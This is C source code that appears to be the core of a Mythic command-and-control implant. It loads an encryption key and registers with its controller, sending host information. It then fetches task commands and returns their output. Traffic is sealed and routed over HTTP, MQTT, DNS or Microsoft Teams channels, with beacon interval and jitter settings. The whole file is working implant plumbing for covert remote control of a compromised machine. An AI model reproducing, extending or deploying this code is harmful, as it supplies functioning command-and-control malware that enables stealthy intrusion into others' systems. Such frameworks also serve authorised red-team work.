#include "common.h"
#include "config.h"
#include "crypto.h"
#include "dns.h"
#include "http.h"
#include "mqtt.h"
#include "mythic.h"
#include "sysinfo.h"
#include "teams.h"
#include "cJSON.h"

int agent_init(agent_t *a) {
    bytebuf_t psk = {0};
    memset(a, 0, sizeof(*a));
    if (config_load(&a->cfg) != 0)
        return -1;
    strncpy(a->uuid, a->cfg.payload_uuid, sizeof(a->uuid) - 1);
    if (strcmp(a->cfg.crypto, "aes256_hmac") == 0) {
        psk.data = b64_decode(a->cfg.psk_b64, &psk.len);
        if (!psk.data || psk.len != 32) {
            bytebuf_free(&psk);
            return -1;
        }
        memcpy(a->psk, psk.data, 32);
        bytebuf_free(&psk);
    }
    a->interval = a->cfg.interval < 0 ? 0 : a->cfg.interval;
    a->jitter = a->cfg.jitter;
    return 0;
}

void agent_free(agent_t *a) {
    SecureZeroMemory(a, sizeof(*a));
}

/* One sealed envelope through the configured profile transport. */
static int transport_exchange(agent_t *a, const unsigned char *sealed, size_t sealed_len,
                              bytebuf_t *out) {
    const char *p = a->cfg.profile;
    out->data = NULL;
    out->len = 0;
    if (p[0] == '\0' || strcmp(p, "http") == 0)
        return http_exchange(&a->cfg, sealed, sealed_len, &out->data, &out->len);
    if (strcmp(p, "mqtt") == 0)
        return mqtt_exchange(&a->cfg, sealed, sealed_len, &out->data, &out->len);
    if (strcmp(p, "dns") == 0)
        return dns_exchange(&a->cfg, &a->dns, sealed, sealed_len, &out->data, &out->len);
    if (strcmp(p, "msteams") == 0)
        return teams_exchange(&a->cfg, &a->teams, sealed, sealed_len, &out->data, &out->len);
    return -1;
}

/* Marshal payload, seal, exchange, open response. Returns parsed JSON. */
static cJSON *round_trip(agent_t *a, cJSON *payload) {
    char *text = NULL;
    char uuid[37];
    bytebuf_t sealed = {0}, raw = {0}, out = {0};
    cJSON *parsed = NULL;
    text = cJSON_PrintUnformatted(payload);
    if (!text)
        return NULL;
    if (mythic_seal_raw(a->uuid, (const unsigned char *)text, strlen(text),
                        a->cfg.crypto, a->psk, &sealed) != 0)
        goto done;
    if (transport_exchange(a, sealed.data, sealed.len, &raw) != 0)
        goto done;
    if (mythic_open_raw(raw.data, raw.len, a->cfg.crypto, a->psk, uuid, &out) != 0)
        goto done;
    parsed = cJSON_ParseWithLength((const char *)out.data, (int)out.len);
done:
    free(text);
    bytebuf_free(&sealed);
    bytebuf_free(&raw);
    bytebuf_free(&out);
    return parsed;
}

const char *json_str(cJSON *o, const char *k) {
    cJSON *v = cJSON_GetObjectItemCaseSensitive(o, k);
    if (!v || !cJSON_IsString(v) || !v->valuestring)
        return "";
    return v->valuestring;
}

double json_num(cJSON *o, const char *k) {
    cJSON *v = cJSON_GetObjectItemCaseSensitive(o, k);
    if (!v || !cJSON_IsNumber(v))
        return 0;
    return v->valuedouble;
}

int agent_checkin(agent_t *a) {
    cJSON *payload = cJSON_CreateObject();
    cJSON *resp = NULL;
    int rc = -1;
    if (!payload)
        return -1;
    cJSON_AddStringToObject(payload, "action", "checkin");
    cJSON_AddStringToObject(payload, "uuid", a->cfg.payload_uuid);
    sysinfo_attach(payload);
    resp = round_trip(a, payload);
    cJSON_Delete(payload);
    if (!resp)
        return -1;
    if (strcmp(json_str(resp, "status"), "success") == 0 && json_str(resp, "id")[0] != '\0') {
        strncpy(a->uuid, json_str(resp, "id"), sizeof(a->uuid) - 1);
        a->uuid[sizeof(a->uuid) - 1] = '\0';
        rc = 0;
    }
    cJSON_Delete(resp);
    return rc;
}

static char *dupstr(const char *s) {
    size_t n;
    char *d;
    if (!s)
        s = "";
    n = strlen(s) + 1;
    d = (char *)malloc(n);
    if (d)
        memcpy(d, s, n);
    return d;
}

task_t *agent_get_tasking(agent_t *a, int *count) {
    cJSON *payload = cJSON_CreateObject();
    cJSON *resp = NULL, *tasks = NULL;
    task_t *out = NULL;
    int n = 0, i;
    *count = 0;
    if (!payload)
        return NULL;
    cJSON_AddStringToObject(payload, "action", "get_tasking");
    cJSON_AddNumberToObject(payload, "tasking_size", a->cfg.tasking_size);
    resp = round_trip(a, payload);
    cJSON_Delete(payload);
    if (!resp)
        return NULL;
    tasks = cJSON_GetObjectItemCaseSensitive(resp, "tasks");
    if (!tasks || !cJSON_IsArray(tasks)) {
        cJSON_Delete(resp);
        return NULL;
    }
    n = cJSON_GetArraySize(tasks);
    out = (task_t *)calloc((size_t)(n > 0 ? n : 1), sizeof(task_t));
    if (!out) {
        cJSON_Delete(resp);
        return NULL;
    }
    for (i = 0; i < n; i++) {
        cJSON *t = cJSON_GetArrayItem(tasks, i);
        out[i].command = dupstr(json_str(t, "command"));
        out[i].parameters = dupstr(json_str(t, "parameters"));
        out[i].id = dupstr(json_str(t, "id"));
        if (!out[i].command || !out[i].parameters || !out[i].id) {
            tasks_free(out, i + 1);
            cJSON_Delete(resp);
            return NULL;
        }
    }
    *count = n;
    cJSON_Delete(resp);
    return out;
}

void tasks_free(task_t *tasks, int count) {
    int i;
    if (!tasks)
        return;
    for (i = 0; i < count; i++) {
        free(tasks[i].command);
        free(tasks[i].parameters);
        free(tasks[i].id);
    }
    free(tasks);
}

/* Merge one {"key": ...} fragment's children into r. */
static void merge_extra_json(cJSON *r, const char *extra_json) {
    cJSON *extra, *child;
    if (!extra_json || *extra_json == '\0')
        return;
    extra = cJSON_Parse(extra_json);
    if (!extra)
        return;
    child = extra->child;
    while (child) {
        cJSON *next = child->next;
        cJSON_DetachItemFromObject(extra, child->string);
        cJSON_AddItemToObject(r, child->string, child);
        child = next;
    }
    cJSON_Delete(extra);
}

cJSON *agent_post_responses_raw(agent_t *a, const response_t *resps, int count) {
    cJSON *payload = cJSON_CreateObject();
    cJSON *arr = NULL, *resp = NULL;
    int i;
    if (!payload)
        return NULL;
    arr = cJSON_AddArrayToObject(payload, "responses");
    if (!arr) {
        cJSON_Delete(payload);
        return NULL;
    }
    cJSON_AddStringToObject(payload, "action", "post_response");
    for (i = 0; i < count; i++) {
        cJSON *r = cJSON_CreateObject();
        if (!r) {
            cJSON_Delete(payload);
            return NULL;
        }
        cJSON_AddStringToObject(r, "task_id", resps[i].task_id);
        cJSON_AddStringToObject(r, "user_output", resps[i].user_output ? resps[i].user_output : "");
        cJSON_AddBoolToObject(r, "completed", resps[i].completed);
        cJSON_AddStringToObject(r, "status", resps[i].status ? resps[i].status : "");
        merge_extra_json(r, resps[i].extra_json);
        cJSON_AddItemToArray(arr, r);
    }
    resp = round_trip(a, payload);
    cJSON_Delete(payload);
    return resp;
}

int agent_post_responses(agent_t *a, const response_t *resps, int count) {
    cJSON *resp = agent_post_responses_raw(a, resps, count);
    if (!resp)
        return -1;
    cJSON_Delete(resp);
    return 0;
}

cJSON *post_reply_find(cJSON *reply, const char *task_id) {
    cJSON *arr;
    int i, n;
    if (!reply || !task_id)
        return NULL;
    arr = cJSON_GetObjectItemCaseSensitive(reply, "responses");
    if (!arr || !cJSON_IsArray(arr))
        return NULL;
    n = cJSON_GetArraySize(arr);
    for (i = 0; i < n; i++) {
        cJSON *r = cJSON_GetArrayItem(arr, i);
        if (strcmp(json_str(r, "task_id"), task_id) == 0)
            return r;
    }
    return NULL;
}

const char *task_arg(const char *parameters, char *scratch, size_t cap) {
    cJSON *root = NULL;
    const char *args = NULL;
    if (!parameters)
        parameters = "";
    root = cJSON_Parse(parameters);
    if (root) {
        cJSON *v = cJSON_GetObjectItemCaseSensitive(root, "arguments");
        if (v && cJSON_IsString(v) && v->valuestring)
            args = v->valuestring;
        if (args) {
            strncpy(scratch, args, cap - 1);
            scratch[cap - 1] = '\0';
            cJSON_Delete(root);
            return scratch;
        }
        cJSON_Delete(root);
    }
    return parameters;
}
